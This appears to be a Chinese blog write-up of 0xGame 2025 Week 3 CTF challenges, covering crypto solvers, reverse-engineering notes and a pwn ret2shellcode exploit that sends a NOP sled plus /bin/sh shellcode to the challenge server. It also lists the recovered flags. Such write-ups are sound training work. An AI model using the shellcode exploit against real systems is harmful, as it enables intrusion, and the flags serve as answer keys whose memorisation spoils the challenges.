io.recvuntil(b'\\n[-]', drop=True).replace(b'\\n', b'')\n    n = int(n_str)\n    e = 65537\n    pwnlog.success(\"Data parsed.\")\n\n    # --- 2. 快速分解 n ---\n    pwnlog.info(\"Factoring n...\")\n    A1 = (pow(py1, 2, n) - pow(px1, 3, n)) % n\n    A2 = (pow(py2, 2, n) - pow(px2, 3, n)) % n\n    delta_A = (A1 - A2) % n\n    f1 = gcd(delta_A, n)\n    f2 = n // f1\n    pwnlog.success(\"n factored into two factors.\")\n\n    # --- 3. 根据超奇异条件确定 p 和 q ---\n    pwnlog.info(\"Identifying p and q based on supersingular conditions...\")\n    p, q = None, None\n    if f1 % 3 == 2 and f2 % 4 == 3:\n        p, q = f1, f2\n        pwnlog.success(\"Assignment found: p = factor1 (p%3=2), q = factor2 (q%4=3).\")\n    elif f2 % 3 == 2 and f1 % 4 == 3:\n        p, q = f2, f1\n        pwnlog.success(\"Assignment found: p = factor2 (p%3=2), q = factor1 (q%4=3).\")\n    else:\n        pwnlog.failure(\"Factors do not meet the expected supersingular conditions. Attack failed.\")\n        io.close()\n        return\n\n    # --- 4. 瞬时计算阶和求解 ---\n    pwnlog.info(\"Calculating orders and solving discrete logs...\")\n    # 阶的计算现在是 O(1)\n    Np = p + 1\n    Nq = q + 1\n    \n    # 在 GF(p) 上求解\n    Fp = GF(p)\n    Ep = EllipticCurve(Fp, [0, q])\n    dp = inverse_mod(e, Np)\n    P1_p = Ep(px1, py1)\n    Q1_p = dp * P1_p\n    x_mod_p = Q1_p[0]\n    \n    # 在 GF(q) 上求解\n    Fq = GF(q)\n    Eq = EllipticCurve(Fq, [p, 0])\n    dq = inverse_mod(e, Nq)\n    P1_q = Eq(px1, py1)\n    Q1_q = dq * P1_q\n    x_mod_q = Q1_q[0]\n\n    # --- 5. 合并结果并立即发送 ---\n    pwnlog.info(\"Combining results with CRT and sending secret...\")\n    x = crt([Integer(x_mod_p), Integer(x_mod_q)], [p, q])\n    secret_bytes = x.to_bytes(126, 'big')[:35]\n    secret_hex = secret_bytes.hex()\n    pwnlog.success(f\"Secret recovered (hex): {secret_hex}\")\n\n    io.sendlineafter(b'[-] Give me the secret:', secret_hex.encode())\n    \n    flag = io.recvall().decode(errors='ignore')\n    pwnlog.success(\"Received response:\\n\" + flag)\n    io.close()\n\nif __name__ == \"__main__\":\n    solve()\n```\n\n由于题目有时间限制，所以按常规对素数的解法会超时，所以我们取素数是超奇异数这一特殊情况，能够加快运算，并能够及时通过pwn把计算出的secret发送给服务器，实现交互，得到flag。\n\n但其实实际上容器生成的随机素数并不全是超奇异数，所以实际需要多运行几次，若容器返回的刚好是超奇异数，就能打通了。\n\nflag：` 0xGame{cab11ca1-2615-4353-8bdc-83acfbc158d9}`\n\n## 变化的公钥\n\n```python\nimport math\nfrom Crypto.Util.number import long_to_bytes\nimport gmpy2\n\n# ========= 您提供的数据 =========\nc_flag = 3768551934826292593833035309611313515410350948177015252689101612760092214724819460968940593137063674343550213845565985577708096326384804161039234286824257\np = 92183828593120412163104340291760641288180588598799559753245539989169201953287\nq = 112341696090923376544622587134650063030670067695398128869588369062187162349067\n\n# 手动交互得到的加密数据 {明文: 密文}\nencrypted_data = {\n    2: 8661456987622729713284875140324390021854656336220032548752643276741012650814412956153724560835436673697707915353315705759467237138561861755697546499239404,\n    3: 4517771087385690059400613106400236028797989648570504435335842458967594563252372288742748213792858933900161922306165687720613665857113406491341498148219072,\n    4: 4461368238758747164492118791058784945853565508910915006788491998225437417465209099602788188410713446842464672424069396400510956103768639651291936269944409,\n    5: 252593148397960384672099236062132976194716239214893311677001562315947306045440602988806836496469883640979695884101793958904581043170908588967763161253161,\n    # ... 您可以根据需要添加更多数据\n}\n\n# ========= 工具函数 (无变动) =========\ndef get_prime_factors(n, limit=1000000):\n    factors = {}\n    d = 2\n    temp_n = n\n    while d * d <= temp_n:\n        if d > limit: break\n        while temp_n % d == 0:\n            factors[d] = factors.get(d, 0) + 1\n            temp_n //= d\n        d += 1\n    if temp_n > 1 and temp_n <= limit:\n        factors[temp_n] = factors.get(temp_n, 0) + 1\n    return sorted(factors.keys())\n\ndef extended_gcd(a, b):\n    if a == 0: return b, 0, 1\n    d, x1, y1 = extended_gcd(b % a, a)\n    x = y1 - (b // a) * x1\n    y = x1\n    return d, x, y\n\ndef chinese_remainder_theorem(congruences):\n    M = 1\n    for _, n_i in congruences: M *= n_i\n    result = 0\n    for a_i, n_i in congruences:\n        M_i = M // n_i\n        _, N_i, _ = extended_gcd(M_i, n_i)\n        result = (result + a_i * M_i * N_i) % M\n    return result\n\n# ========= 离线解密主逻辑 =========\ndef solve_offline():\n    n = p * q\n    phi_n = (p - 1) * (q - 1)\n\n    print(f\"[+] n: {str(n)[:30]}...\")\n    print(f\"[+] phi(n): {str(phi_n)[:30]}...\")\n    \n    factors = get_prime_factors(phi_n, limit=1000000)\n    print(f\"[+] Found {len(factors)} small prime factors of phi(n) up to 1,000,000.\")\n\n    congruences = []\n    moduli_product = 1\n    E_UPPER_BOUND = 2**300\n\n    for p_i in factors:\n        print(f\"\\n[*] Trying to find e mod {p_i}\")\n\n        # 寻找合适的基 m\n        base_m = -1\n        for m in sorted(encrypted_data.keys()):\n            # 检查这个基 m 是否能用\n            if pow(m, phi_n // p_i, n) != 1:\n                base_m = m\n                break\n        \n        if base_m == -1:\n            print(f\"    - Could not find a suitable base in provided data for p_i = {p_i}. Skipping.\")\n            continue\n        \n        print(f\"    - Using base m = {base_m} from provided data.\")\n        \n        m_prime = pow(base_m, phi_n // p_i, n)\n        c_m = encrypted_data[base_m]\n        c_prime = pow(c_m, phi_n // p_i, n)\n        \n        found_x = -1\n        for x in range(p_i):\n            if pow(m_prime, x, n) == c_prime:\n                found_x = x\n                break\n        \n        if found_x != -1:\n            print(f\"    - Solved! e \\u2261 {found_x} (mod {p_i})\")\n            congruences.append((found_x, p_i))\n            moduli_product *= p_i\n        else:\n            print(f\"    - Failed to solve for e mod {p_i}.\")\n        \n        if moduli_product > E_UPPER_BOUND:\n            print(\"\\n[+] Collected enough congruences to determine e.\")\n            break\n            \n    if moduli_product <= E_UPPER_BOUND:\n        print(\"\\n[-] Could not find enough small prime factors to determine e. The attack failed.\")\n        return\n\n    print(\"\\n[*] Solving for e using Chinese Remainder Theorem...\")\n    e = chinese_remainder_theorem(congruences)\n    print(f\"[+] Found e: {e}\")\n\n    if gmpy2.is_prime(e):\n        print(\"[+] Verification successful: e is a prime number.\")\n    else:\n        print(\"[!] Warning: Calculated e is not a prime number.\")\n\n    print(\"\\n[*] Calculating private key d and decrypting the flag...\")\n    d = pow(e, -1, phi_n)\n    flag_val = pow(c_flag, d, n)\n    \n    try:\n        flag = long_to_bytes(flag_val)\n        print(\"\\n\" + \"=\"*50)\n        print(f\"[*] DECRYPTED FLAG: {flag.decode()}\")\n        print(\"=\"*50)\n    except Exception as err:\n        print(f\"\\n[-] Failed to decode the flag: {err}\")\n        print(f\"[*] Decrypted integer value: {flag_val}\")\n\nif __name__ == '__main__':\n    solve_offline()\n```\n\n类似Pohlig-Hellman攻击，在这个子群里解DLP，解出很多模数互质的解后就可以解原题了，通过很多个加密过的数来逆向还原加密过程，求解e，p，q，从而解出flag：`0xGame{69d14068-30b4-41df-a17b-de434c3bc7b8}`\n\n# pwn\n\n## ret2shellcode\n\n```python\nimport pwn\npwn.context.arch = 'amd64'\np = pwn.remote('nc1.ctfplus.cn',36618)\np.recvuntil(b\"time\")\n\nshellcode = pwn.asm(pwn.shellcraft.sh())\n\n# payload: 填充 + NOP滑梯 + Shellcode\npayload = b'a'*80 + b'\\x90' *80 + shellcode\n\np.send(payload)\np.interactive()\n```\n\n**pwn.shellcraft 会根据 context 自动生成对应的 shellcode**\n\n- `pwn.shellcraft.sh()`用pwn里的shellcraft板子sh()生成执行`execve(\"/bin/sh\", NULL, NULL)`得到shell的汇编\n- 然后使用`pwn.asm()`函数将汇编指令转换成二进制机器码（字节流），这样子发送过去才能被识别。\n- 最重要的是`NOP`空指令滑梯，由于程序在80-159之间跳转的偏移是不确定的，若将shellcode放在这个区域,会导致程序不能从第一条shellcode指令开始正确的执行，所以我们可以使用NOP指令（机器码0x90，填充为\\x90），`b'\\x90'*80`,b' '表示以字节流发送，用`\\x90`(空指令)填充完这个不确定的区域，让程序就像在一个“滑梯”上向下滑行，直到滑出这个区域，执行我们紧跟在后面的真实 shellcode。\n\n得到flag：`0xGame{Not_only_nop_can_jmp_controlstream}`\n\n# Re\n\n## apk逆向\n\n`_4nd_dex_loader}`:\n\n```python\n# 导入z3库\nfrom z3 import *\n\n# 1. 定义变量\n# 每个变量是16个十六进制字符，即 64 位\nv0, v1, v2 = BitVecs('v0 v1 v2', 64)\n\n# 2. 创建求解器实例\ns = Solver()\n\n# 3. 添加数学方程约束\ns.add(v1 + v0 * 3 == 27454419028250566601)\ns.add(v2 * 2 - v1 * 5 + 20616666104378640363 == 0)\ns.add(v0 + v2 * 4 == 0x1dce62be9f0fa2f6c)\n\n# 4. 添加结构性约束\n# v1 由 v0 的低32位 (Extract(31, 0, v0)) 和 v2 的高32位 (Extract(63, 32, v2)) 组成\ns.add(v1 == Concat(Extract(31, 0, v0), Extract(63, 32, v2)))\n\n# 5. 检查解是否存在并输出\nif s.check() == sat:\n    m = s.model()\n    # 提取v0和v2的值\n    val_v0 = m[v0].as_long()\n    val_v2 = m[v2].as_long()\n\n    # 将v0和v2的值格式化为16位的十六进制字符串\n    hex_v0 = format(val_v0, '016x')\n    hex_v2 = format(val_v2, '016x')\n    \n    # 最终的输入字符串 str 是 v0 和 v2 的拼接\n    flag_hex = hex_v0 + hex_v2\n    \n    print(f\"求解成功!\")\n    print(f\"v0 = 0x{hex_v0}\")\n    print(f\"v2 = 0x{hex_v2}\")\n    print(f\"拼接后的Hex字符串: {flag_hex}\")\n    \n    # 将十六进制字符串转换为ASCII字符\n    try:\n        flag_ascii = bytes.fromhex(flag_hex).decode('utf-8')\n        print(f\"ASCII结果: {flag_ascii}\")\n    except Exception as e:\n        print(f\"转换为ASCII失败: {e}\")\n\nelse:\n    print(\"求解失败，方程无解。\")\n```\n\n资源文件-->Assets-->dex.zip,**.zip文件一般是不会出现在这里的**，所以flag的关键应该就放在这里面，导出这个dex.zip文件，解压缩，010打开查看文件头，是**64 65 78 0A**，所以这个其实并不是zip，而是一个dex文件，更改文件名为dex.dex，用jadx打开，就能看到反编译的源码了，用z3解方程组，得到后半段`_4nd_dex_loader}`\n\n`0xGame{Do_y0u_l0v3_andr01d`:\n\n前半段在源代码-->com-->example.easyapp-->MainActivity-->onCreate$lambda$方法中找到base64编码过的flag：`MHhHYW1le0RvX3kwdV9sMHYzX2FuZHIwMWQ=`\n\n解码得到`0xGame{Do_y0u_l0v3_andr01d`\n\n拼接flag得到：`0xGame{Do_y0u_l0v3_andr01d_4nd_dex_loader}`\n\n**一般都在源代码-->com-->MainActivity里面**\n\n## 扫雷\n\n分析`.js`文件，可以看到触发给flag的逻辑，当难度为expert时玩家胜利会触发`_0x20eae2`这个函数，函数内部调用了`_0x172ca4`函数，这里包含了解密flag的逻辑--**重复密钥异或**(XOR)，密钥key--`WebIsInteresting`和flag密文`g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P}^}\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e`，\n\n逆向解密：\n\n```python\nencrypted_data = b\"g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P}^}\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e\"\nkey = b\"WebIsInteresting\"\ndecrypted_data = bytearray()\n\nfor i in range(len(encrypted_data)):\n  decrypted_data.append(encrypted_data[i] ^ key[i % len(key)])\n\nflag = decrypted_data.decode()\nprint(flag)\n```\n\n得到flag：`0xGame{463950f9-9824-4bfb-8230-98ab02d431d0}`\n\n## VBS\n\n把`Execute`改为`wscript.echo`，然后在终端输入`cscript.exe 1.vbs`就能得到源代码输出到终端，\n\n- `wscript.exe 1.vbs`   输出到一个程序窗口，不方便复制，\n- `cscript.exe 1.vbs`    输出到终端，更方便复制。\n\n可以观察到源码分两段，中间有`Execute Code`分隔，修改原.vbs，最后一行加上`Wscripts.Echo`，就能看到去了第二层混淆的源码，\n\n但是再观察一下，后面还是好几行的乱码，于是再进行`Execute`到`Wscript.Echo`的转换，三层混淆，我没招了😭😭\n\n三层混淆解完之后，就能看到base64编码表`fx6LUY5at9lnwmd3TbqzuRy+AipWHPDoXZKMFGCV2I/QjSreEsh18NJkg0v74OcB`和flag密文`waZaAyNGDJ9CwLfNdzYCnyUsAJtSmLU0wqNKmLYFnyT8iyRMi5UEAMH0da8=`，放到cyberchef里解一下密，得到flag：`0xGame{bf00591f-a1cb-4191-b41d-d4eecda0b798}`\n\n","slug":"0xGame2025Week3WP","published":1,"updated":"2025-11-07T13:41:08.322Z","_id":"cmhowggik000058t8a4zzef9o","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"Ez-LLL\"><a href=\"#Ez-LLL\" class=\"headerlink\" title=\"Ez_LLL\"></a>Ez_LLL</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">151240196317566398919874094060690044886978001146739221635377812709640347441550250665168046149125216617951660209690860015625296899030453965800801283336223544189902980591153121592938172963303968803995733283426759581586368403208379337416298836517168491618212440911971420911495272791409112867645195821357346746831</span></span><br><span class=\"line\">h = <span class=\"number\">124332746104765845147133491132959579184849644379099440465281812273660434050281263409975356196112560300248343107170084466976976410232928660489912629913525776979726428263975968343564076005019264661696777686114079504603568726429498116488469855127100166072195548037981863885014261706582936943023968781022607949646</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Build lattice</span></span><br><span class=\"line\">M = matrix(ZZ, [</span><br><span class=\"line\">    [<span class=\"number\">1</span>, h],</span><br><span class=\"line\">    [<span class=\"number\">0</span>, p]</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># LLL reduction</span></span><br><span class=\"line\">L = M.LLL()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> L:</span><br><span class=\"line\">    f_candidate = <span class=\"built_in\">abs</span>(row[<span class=\"number\">0</span>])</span><br><span class=\"line\">    g_candidate = <span class=\"built_in\">abs</span>(row[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"comment\"># Check if g_candidate is 350-bit prime</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> g_candidate.nbits() == <span class=\"number\">350</span> <span class=\"keyword\">and</span> is_prime(g_candidate):</span><br><span class=\"line\">        flag = long_to_bytes(f_candidate)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;0xGame&#x27;</span> <span class=\"keyword\">in</span> flag:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Found flag:&quot;</span>, flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>LLL 格基规约算法，得到<code>0xGame&#123;8dc1f4b8-3f4e-4c3e-9d1a-2b5e6f7a8b9c&#125;</code></p>\n<h2 id=\"Copper\"><a href=\"#Copper\" class=\"headerlink\" title=\"Copper\"></a>Copper</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">92873040755425037862453595432032305849700597051458113741962060511759338242511707376645887864988028778023918585157853023538298808432423892753226386473625357887471318145132753202886684219309732628049959875215531475307942392884965913932053771541589293948849554008069165822411930991003624635227296915315188938427</span></span><br><span class=\"line\">gift = <span class=\"number\">10911712225716809560802315710689854621004330184657267444255298781464639032414821020145885934381310240257843204972266622870698161556175406337237650652528640</span></span><br><span class=\"line\"></span><br><span class=\"line\">pbits = <span class=\"number\">512</span></span><br><span class=\"line\">kbits = <span class=\"number\">242</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 直接使用标准已知高位分解方法</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">factor_with_high_bits</span>(<span class=\"params\">n, high, unknown_bits, p_total_bits=<span class=\"number\">512</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> Zmod, PolynomialRing</span><br><span class=\"line\">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    f = high + x</span><br><span class=\"line\">    <span class=\"comment\"># 尝试不同的 beta 值</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> beta <span class=\"keyword\">in</span> [<span class=\"number\">0.48</span>, <span class=\"number\">0.45</span>, <span class=\"number\">0.42</span>, <span class=\"number\">0.4</span>, <span class=\"number\">0.38</span>, <span class=\"number\">0.35</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> epsilon <span class=\"keyword\">in</span> [<span class=\"number\">0.01</span>, <span class=\"number\">0.03</span>, <span class=\"number\">0.05</span>, <span class=\"number\">0.08</span>, <span class=\"number\">0.1</span>]:</span><br><span class=\"line\">            roots = f.small_roots(X=<span class=\"number\">2</span>^unknown_bits, beta=beta, epsilon=epsilon)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> roots:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> roots[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">x0 = factor_with_high_bits(n, gift, kbits)</span><br><span class=\"line\"><span class=\"keyword\">if</span> x0 <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">    p = gift + <span class=\"built_in\">int</span>(x0)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n % p == <span class=\"number\">0</span>:</span><br><span class=\"line\">        q = n // p</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;成功分解!&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 解密</span></span><br><span class=\"line\">        e = <span class=\"number\">65537</span></span><br><span class=\"line\">        c = <span class=\"number\">78798946231057858237017891544035026520248922588969396262361286907576401467816384819451190528802344534495780520382462432888103466971743435370588783181267466189564132373143717299869053172848786781320750631382630113459268771330862538801774075395201914653025347332312015985213462835680853607187971669296490439714</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        phi = (p-<span class=\"number\">1</span>) * (q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi)</span><br><span class=\"line\">        m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\">        flag = long_to_bytes(<span class=\"built_in\">int</span>(m))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;p 不整除 n&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;没有找到解&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Coppersmith是一种用来求解多项式方程小根的方法.</p>\n<p>在<code>sagemath</code>里运行上面的脚本，得到flag：<code>0xGame&#123;C0pp3r_4nd_mu1t1pl3_pr0gr3ss1ng!!!&#125;</code></p>\n<h2 id=\"LLL\"><a href=\"#LLL\" class=\"headerlink\" title=\"LLL\"></a>LLL</h2><ol>\n<li><strong>构造格 (Lattice)</strong>：我们将从 output.txt 文件中读出的矩阵的行向量作为格的一组基。</li>\n<li><strong>运行 LLL 算法</strong>：对这组基进行 LLL 规约，算法会找到一组新的基，其中包含一些非常短的向量。</li>\n<li><strong>寻找 Flag</strong>：我们要找的 flag 向量就隐藏在这些短向量中。由于矩阵乘法的影响，找到的短向量可能是原始 flag 向量的某个整数倍（例如 k * flag）。</li>\n<li><strong>恢复 Flag</strong>：<ul>\n<li>我们遍历规约后基里的每一个短向量。</li>\n<li>计算向量中所有元素的最大公约数（GCD），这个 GCD 可能就是 k。</li>\n<li>将整个向量除以 k（或 -k），得到候选的 flag 向量。</li>\n<li>检查候选向量的每个元素是否都在有效的 ASCII 范围内，并尝试将其转换为字符串。</li>\n<li>验证字符串是否符合 0xGame{…} 的格式。</li>\n</ul>\n</li>\n</ol>\n<p>注意本题的.txt中的矩阵需要先进行<strong>转置</strong>，再LLL规约。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">from</span> fpylll <span class=\"keyword\">import</span> IntegerMatrix, LLL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    主解决函数，读取矩阵，运行 LLL 算法并寻找 Flag。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 1. 解析 output.txt 文件</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;output.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            content = f.read()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用 ast.literal_eval 安全地将文件内容（字符串形式的列表）转换为 Python 对象</span></span><br><span class=\"line\">        matrix_C = ast.literal_eval(content)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 确保我们得到的是一个矩阵（列表的列表）</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(matrix_C, <span class=\"built_in\">list</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> <span class=\"built_in\">all</span>(<span class=\"built_in\">isinstance</span>(row, <span class=\"built_in\">list</span>) <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> matrix_C):</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;文件内容不是一个有效的矩阵（列表的列表）&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 读取或解析 output.txt 时出错: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 请确保 output.txt 与脚本在同一目录，且内容为有效的矩阵格式，例如 [[1, 2], [3, 4]]。&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 第一次尝试：直接使用原始矩阵的行向量作为基 ---</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;--- 尝试 1: 使用原始矩阵 C 的行向量 ---&quot;</span>)</span><br><span class=\"line\">    found_flag = find_flag_in_basis(matrix_C)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> found_flag:</span><br><span class=\"line\"> 